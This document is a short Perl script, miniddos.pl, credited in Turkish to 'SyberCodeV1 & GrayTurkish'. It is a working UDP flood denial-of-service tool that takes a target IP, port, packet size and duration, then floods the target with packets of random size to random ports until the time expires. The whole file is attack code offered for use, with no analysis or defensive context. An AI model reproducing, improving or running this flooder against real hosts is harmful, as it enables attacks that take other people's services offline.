#!/usr/bin/perl

#Args
# 1 - IP
# 2 - Port
# 3 - Size of the packet to send
# 4 - Time in secondes
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "-ipucu kullanabilmek için: perl miniddos.pl {ip-adresi} {port} {paket-sayisi} {zaman}\n";
  print "Coder SyberCodeV1 & GrayTurkish\n";
  print "instagram.com/sybercodev1.vip & instagram.com/grayturkish\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~Saldırıyı durdurmak için\'Ctrl-C\'\n\n";
print "|IP|\t\t |Port|\t\t |paket|\t\t |zaman|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "saldırıyı durdurmak için\'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
©
